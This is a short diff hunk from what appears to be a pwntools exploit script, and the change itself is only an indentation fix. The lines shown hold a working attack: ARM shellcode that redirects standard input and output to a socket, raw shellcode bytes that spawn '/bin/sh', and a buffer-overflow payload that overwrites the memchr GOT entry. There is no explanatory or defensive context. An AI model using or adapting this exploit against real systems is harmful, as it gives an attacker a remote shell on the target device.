@@ -30,9 +30,9 @@ sleep(1)
 # Construct and send the second chunk, this will inject shellcode and overwrite memchr@GOT to shellcode address
 shellcode = asm(
     shellcraft.nop()*0x10 + 
-	shellcraft.arm.linux.dup2(4, 0) +
-	shellcraft.arm.linux.dup2(4, 1) +
-	shellcraft.arm.linux.dup2(4, 2)
+    shellcraft.arm.linux.dup2(4, 0) +
+    shellcraft.arm.linux.dup2(4, 1) +
+    shellcraft.arm.linux.dup2(4, 2)
     )
 shellcode += "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x7f\x40\x2f\x62\x69\x6e\x2f\x73\x68\x41"
 payload2 = "A"*136 + p32(0x11e04) + shellcode
